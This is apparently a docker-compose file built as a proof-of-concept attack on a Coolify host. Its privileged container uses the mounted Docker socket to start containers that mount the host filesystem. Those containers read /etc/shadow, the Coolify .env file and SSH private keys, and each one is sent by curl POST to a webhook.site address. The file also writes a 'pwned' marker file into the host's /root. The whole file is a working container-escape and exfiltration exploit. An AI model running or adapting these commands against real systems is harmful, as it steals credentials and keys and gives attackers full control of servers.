version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl docker-cli
        
        # 1. Доказательство: хостовый Docker запускает новый контейнер с маунтом всего корня
        docker run --rm -v /:/host_root alpine:3.19 sh -c "cat /host_root/etc/shadow | head -5 | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_shadow"
        
        # 2. Читаем главный .env через новый контейнер с явным маунтом /data
        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_env"
        
        # 3. Читаем SSH ключи через новый контейнер
        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/ssh/keys/ssh_key@* | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_ssh"
        
        # 4. Создаем proof-файл прямо в /root хоста (гарантированно не tmpfs)
        docker run --rm -v /root:/host_root alpine:3.19 sh -c "echo 'RCE_PROOF_DOCKER_SOCKET_$(date +%s)' > /host_root/coolify_pwned.txt"
        
        sleep 3600
